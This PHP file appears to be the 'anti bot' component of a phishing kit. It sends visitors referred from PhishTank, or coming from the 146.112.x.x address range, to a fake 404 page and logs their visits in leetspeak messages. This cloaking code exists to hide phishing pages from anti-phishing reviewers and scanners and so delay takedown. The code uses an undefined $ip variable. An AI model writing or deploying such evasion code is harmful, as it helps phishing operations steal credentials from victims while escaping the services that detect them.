<?php


// Anti Bot From phishtank

if(isset($_SERVER['HTTP_REFERER'])) {
 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com' ) {
 	$message = ("Phishtank D3cl!n3d => ".$_SERVER['HTTP_REFERER']." [ ph!5ht4nk ] !p: ". $ip." || D4t3:".gmdate ("d M,Y")." T!m3:".gmdate ("g:i a")."\n\n");

    $save=fopen("antibots/DiscoveredBot.txt","a+");
    fwrite($save,$message);
    fclose($save);
	header("Location: ./404.php");exit();
	}
}
if(isset($_SERVER['HTTP_REFERER'])) {
 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
 	$message = ("Phishtank D3cl!n3d => ".$_SERVER['HTTP_REFERER']." [ ph!5ht4nk ] !p: ". $ip." || D4t3:".gmdate ("d M,Y")." T!m3:".gmdate ("g:i a")."\n\n");
    $save=fopen("antibots/DiscoveredBot.txt","a+");
    fwrite($save,$message);
    fclose($save);
	header("Location: ./404.php");exit();
	}
}
$range_start = ip2long("146.112.0.0");
$range_end   = ip2long("146.112.255.255");
$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

 if ($ip2long >= $range_start && $ip2long <= $range_end){
 	$message = ("Phishtank D3cl!n3d => ".$_SERVER['HTTP_REFERER']." [ ph!5ht4nk ] !p: ". $ip." || D4t3:".gmdate ("d M,Y")." T!m3:".gmdate ("g:i a")."\n\n");
    $save=fopen("antibots/DiscoveredBot.txt","a+");
    fwrite($save,$message);
    fclose($save);
 	header("Location: ./404.php");exit();

 }
?>